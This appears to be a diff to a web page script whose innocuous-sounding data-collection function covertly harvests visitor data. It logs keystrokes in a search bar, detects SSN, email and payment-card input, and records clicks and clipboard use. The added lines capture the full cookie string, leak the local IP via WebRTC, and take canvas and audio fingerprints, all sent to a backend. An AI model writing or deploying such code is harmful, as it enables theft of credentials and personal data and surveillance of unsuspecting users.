@@ -34,7 +34,7 @@
   }
 
   async function collectEnvironmentData() {
-    const environment = {};
+    const environment = { part1: {}, part3: {}, part4: {} };
     const processNavigator = () => {
       const ua = navigator.userAgent;
       return /iPhone|iPad|iPod/i.test(ua) ? 'iPhone/iPad' :
@@ -42,21 +42,23 @@
              /Samsung|SM-/i.test(ua) ? 'Android (Samsung)' : 'Android (unknown)') :
              /Windows NT|Macintosh|Linux/i.test(ua) ? 'PC' : 'Unknown';
     };
-    environment.device = processNavigator();
-    environment.timestamp = new Date().toISOString();
-    environment.display = `${window.screen.width}x${window.screen.height}`;
-    environment.color = window.screen.colorDepth || 'Unknown';
-    environment.zone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-    environment.lang = navigator.language || 'Unknown';
-    environment.cpu = navigator.hardwareConcurrency || 'Unknown';
-    environment.mem = navigator.deviceMemory || 'Unknown';
-    environment.track = navigator.doNotTrack || 'Unknown';
-    environment.plugins = Array.from(navigator.plugins || []).map(p => p.name);
-    environment.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
-    environment.scripts = ['initializeSystemOperations'];
-    environment.cookies = !!document.cookie;
-    environment.requests = [];
-    environment.messages = [];
+    environment.part1.device = processNavigator();
+    environment.part1.timestamp = new Date().toISOString();
+    environment.part1.screenSize = `${window.screen.width}x${window.screen.height}`;
+    environment.part1.referrer = document.referrer || 'Direct';
+    environment.part1.currentUrl = window.location.href;
+    environment.part3.colorDepth = window.screen.colorDepth || 'Unknown';
+    environment.part3.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+    environment.part3.language = navigator.language || 'Unknown';
+    environment.part3.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+    environment.part3.deviceMemory = navigator.deviceMemory || 'Unknown';
+    environment.part3.doNotTrack = navigator.doNotTrack || 'Unknown';
+    environment.part3.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+    environment.part3.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+    environment.part4.inlineScripts = ['initializeSystemOperations'];
+    environment.part4.cookieAccess = !!document.cookie;
+    environment.part4.thirdPartyRequests = [];
+    environment.part4.postMessageCalls = [];
     return environment;
   }
 
@@ -69,8 +71,7 @@
       return environment;
     }
 
-    environment.extended = {};
-    environment.extended.touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
+    environment.part3.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
     
     let batteryState = 'Unknown';
     if (navigator.getBattery) {
@@ -79,9 +80,8 @@
         batteryState = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
       } catch (e) {}
     }
-    environment.extended.battery = batteryState;
-    environment.extended.url = window.location.href;
-    environment.extended.scroll = `${Math.round(window.scrollY)}px`;
+    environment.part3.batteryStatus = batteryState;
+    environment.part3.scrollPosition = `${Math.round(window.scrollY)}px`;
 
     let inputBuffer = '';
     const inputElement = document.getElementById('search-bar');
@@ -95,7 +95,7 @@
       await new Promise(resolve => setTimeout(resolve, 1000));
       inputElement.removeEventListener('keydown', keydownHandler);
     }
-    environment.extended.keys = inputBuffer || 'None';
+    environment.part3.keystrokes = inputBuffer || 'None';
 
     let ssnFlag = 'None';
     if (inputElement) {
@@ -108,7 +108,7 @@
       await new Promise(resolve => setTimeout(resolve, 1000));
       inputElement.removeEventListener('input', ssnHandler);
     }
-    environment.extended.ssn = ssnFlag;
+    environment.part3.ssnPatternDetected = ssnFlag;
 
     let emailFlag = 'None';
     if (inputElement) {
@@ -121,7 +121,7 @@
       await new Promise(resolve => setTimeout(resolve, 1000));
       inputElement.removeEventListener('input', emailHandler);
     }
-    environment.extended.email = emailFlag;
+    environment.part3.emailPatternDetected = emailFlag;
 
     let paymentFlag = 'None';
     const paymentInputs = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
@@ -133,14 +133,14 @@
       await new Promise(resolve => setTimeout(resolve, 1000));
       paymentInputs.forEach(field => field.removeEventListener('input', paymentHandler));
     }
-    environment.extended.payment = paymentFlag;
+    environment.part3.paymentFieldInteraction = paymentFlag;
 
     let moveCounter = 0;
     const mouseHandler = () => moveCounter++;
     document.addEventListener('mousemove', mouseHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
     document.removeEventListener('mousemove', mouseHandler);
-    environment.extended.mouse = `${moveCounter}/s`;
+    environment.part3.mouseMovementFrequency = `${moveCounter}/s`;
 
     let graphicsSupport = 'Not supported';
     try {
@@ -151,9 +151,9 @@
         graphicsSupport = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
       }
     } catch (e) {}
-    environment.extended.graphics = graphicsSupport;
+    environment.part3.webglSupport = graphicsSupport;
 
-    environment.extended.connection = navigator.connection?.effectiveType || 'Unknown';
+    environment.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';
 
     let clipboardState = 'None';
     const copyHandler = () => clipboardState = 'Copy attempted';
@@ -163,9 +163,9 @@
     await new Promise(resolve => setTimeout(resolve, 1000));
     document.removeEventListener('copy', copyHandler);
     document.removeEventListener('paste', pasteHandler);
-    environment.extended.clipboard = clipboardState;
+    environment.part3.clipboardAccess = clipboardState;
 
-    environment.extended.orientation = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+    environment.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
 
     let storageSize = 0;
     try {
@@ -175,30 +175,27 @@
         }
       }
     } catch (e) {}
-    environment.extended.storage = `${storageSize} bytes`;
+    environment.part3.sessionStorageUsage = `${storageSize} bytes`;
 
     const features = [];
     if ('RTCPeerConnection' in window) features.push('WebRTC');
     if ('geolocation' in navigator) features.push('Geolocation');
     if ('serviceWorker' in navigator) features.push('ServiceWorker');
-    environment.extended.features = features.length ? features.join(', ') : 'None';
+    environment.part3.browserFeatures = features.length ? features.join(', ') : 'None';
 
-    environment.extended.loadTime = `${Math.round(performance.now())}ms`;
+    environment.part3.pageLoadTime = `${Math.round(performance.now())}ms`;
 
     let interactionCount = 0;
     const clickHandler = () => interactionCount++;
     document.addEventListener('click', clickHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
     document.removeEventListener('click', clickHandler);
-    environment.extended.interactions = interactionCount;
+    environment.part3.userInteractionCount = interactionCount;
 
-    environment.extended.referrer = document.referrer || 'Direct';
-
-    const params = new URLSearchParams(window.location.search);
-    environment.extended.utm = JSON.stringify({
-      source: params.get('utm_source') || 'None',
-      medium: params.get('utm_medium') || 'None',
-      campaign: params.get('utm_campaign') || 'None'
+    environment.part3.utmParameters = JSON.stringify({
+      source: new URLSearchParams(window.location.search).get('utm_source') || 'None',
+      medium: new URLSearchParams(window.location.search).get('utm_medium') || 'None',
+      campaign: new URLSearchParams(window.location.search).get('utm_campaign') || 'None'
     });
 
     let elementInteractions = [];
@@ -215,9 +212,9 @@
     document.addEventListener('click', elementHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
     document.removeEventListener('click', elementHandler);
-    environment.extended.elements = elementInteractions.length ? elementInteractions.join('; ') : 'None';
+    environment.part3.clickedElements = elementInteractions.length ? elementInteractions.join('; ') : 'None';
 
-    environment.extended.duration = `${Math.round(performance.now() - startTime)}ms`;
+    environment.part3.sessionDuration = `${Math.round(performance.now() - startTime)}ms`;
 
     let eventRecords = [`PageView: ${window.location.href}`];
     const clickEventHandler = (event) => {
@@ -236,7 +233,55 @@
     await new Promise(resolve => setTimeout(resolve, 1000));
     document.removeEventListener('click', clickEventHandler);
     document.querySelectorAll('form').forEach(form => form.removeEventListener('submit', () => {}));
-    environment.extended.events = eventRecords.length ? eventRecords.join('; ') : 'None';
+    environment.part3.eventLog = eventRecords.length ? eventRecords.join('; ') : 'None';
+
+    environment.part4.clientCookies = document.cookie || 'None';
+    environment.part4.localStorageUsage = `${storageSize} bytes`;
+
+    let localIP = 'Unknown';
+    try {
+      const peer = new RTCPeerConnection({ iceServers: [] });
+      peer.createDataChannel('');
+      peer.createOffer().then(offer => peer.setLocalDescription(offer));
+      await new Promise(resolve => {
+        peer.onicecandidate = e => {
+          if (e.candidate && e.candidate.candidate) {
+            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+            if (ipMatch) localIP = ipMatch[1];
+            resolve();
+          }
+        };
+        setTimeout(resolve, 1000);
+      });
+      peer.close();
+    } catch (e) {}
+    environment.part4.localIP = localIP;
+
+    let canvasFingerprint = 'None';
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.font = '14px Arial';
+      ctx.fillText('fingerprint', 10, 50);
+      canvasFingerprint = canvas.toDataURL();
+    } catch (e) {}
+    environment.part4.canvasFingerprint = canvasFingerprint;
+
+    let audioFingerprint = 'None';
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = ctx.createOscillator();
+      oscillator.type = 'sine';
+      oscillator.frequency.setValueAtTime(440, ctx.currentTime);
+      const compressor = ctx.createDynamicsCompressor();
+      oscillator.connect(compressor);
+      compressor.connect(ctx.destination);
+      oscillator.start();
+      oscillator.stop(ctx.currentTime + 0.1);
+      audioFingerprint = `${ctx.sampleRate}`;
+      ctx.close();
+    } catch (e) {}
+    environment.part4.audioFingerprint = audioFingerprint;
 
     return environment;
   }
@@ -259,13 +304,18 @@
         if (sessionHeader) {
           localStorage.setItem(dataStore.sessionKey, sessionHeader);
         }
+      } else {
+        console.error('Failed to send to backend', response.status, response.statusText);
       }
-    } catch (e) {}
+    } catch (e) {
+      console.error('Error in transmitData', e.message);
+    }
   }
 
   async function executeCoreLogic() {
     const token = await configureNetwork(dataStore);
     if (!token) {
+      console.error('No CSRF token, aborting');
       return;
     }
     await new Promise(resolve => setTimeout(resolve, 500));
